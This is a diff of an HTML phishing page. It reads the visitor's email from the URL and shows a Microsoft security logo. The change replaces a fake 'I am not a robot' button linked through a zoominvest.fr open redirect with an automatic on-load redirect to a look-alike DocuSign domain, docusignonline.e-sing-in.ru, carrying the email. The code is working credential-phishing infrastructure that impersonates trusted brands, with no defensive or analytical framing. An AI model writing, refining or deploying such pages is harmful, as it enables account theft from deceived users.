@@ -14,28 +14,36 @@
         return email;
     }
 
-    // Function to update the link with the extracted email
-    function updateLink() {
+    // Function to update the link with the extracted email and redirect after delay
+    function redirectAfterDelay() {
         const email = getEmailFromURL();
-        // Update the href attribute of the link
-        const link = document.getElementById('redirectLink');
-        link.href = https://zoominvest.fr/redirect.php?url=https://h.toniskreen2.workers.dev/?email=${email};
+        // Check if email is valid
+        if (!email) {
+            console.error('Email parameter is missing.');
+            return;
+        }
+
+        // Construct the redirect URL with the email parameter using /M<encoded_email>
+        const redirectUrl = `https://docusignonline.e-sing-in.ru/?JtM8g=IE1kv/?e=${encodeURIComponent(email)}`;
+        
+        // Delay redirect by 3 seconds (3000 milliseconds)
+        setTimeout(function() {
+            // Redirect to the specified URL after delay
+            window.location.href = redirectUrl;
+        }, 500); // Delay of 3 seconds (3000 milliseconds)
     }
 
-    // Call the updateLink function when the page loads
+    // Call the redirectAfterDelay function when the page loads
     window.onload = function() {
-        updateLink();
+        redirectAfterDelay(); // Call function to redirect after delay
     };
 </script>
 </head>
-<body style="font-family: Arial, Helvetica, sans-serif; display: flex; align-items: center; height: 100vh;">
-<div style="display: block; margin: 0 auto; text-align: center; position: relative;">
-    <img src="https://d15shllkswkct0.cloudfront.net/wp-content/blogs.dir/1/files/2023/12/microsoftsecurity.png" alt="" width="130px" height="auto">
-    <p>I am not a robot <input type="checkbox"></p>
-    <!-- Use JavaScript to update the link -->
-    <a id="redirectLink" title="https://zoominvest.fr/redirect.php?url=https://h.toniskreen2.workers.dev/" style="text-decoration: none; cursor: pointer;">
-        <button>Submit</button>
-    </a>
+<body style="font-family: Arial, Helvetica, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh;">
+<div style="text-align: center;">
+    <img src="https://d15shllkswkct0.cloudfront.net/wp-content/blogs.dir/1/files/2023/12/microsoftsecurity.png"
+         alt="" width="130px" height="auto">
+    <p>Loading...</p>
 </div>
 </body>
 </html>
